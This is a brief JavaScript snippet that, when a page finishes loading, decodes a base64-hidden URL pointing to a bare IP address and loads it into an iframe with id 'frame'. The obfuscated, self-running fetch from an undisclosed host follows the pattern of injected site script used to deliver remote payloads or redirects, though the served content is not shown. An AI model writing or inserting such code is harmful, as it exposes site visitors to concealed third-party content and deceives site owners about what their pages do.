document.addEventListener("DOMContentLoaded", function() {
    function decode(input) {
        return atob(input);
    }
    
    var url = decode("aHR0cHM6Ly80OS4yMzQuMzEuMTcwLw==");
    var iframe = document.getElementById('frame');
    iframe.src = url;
});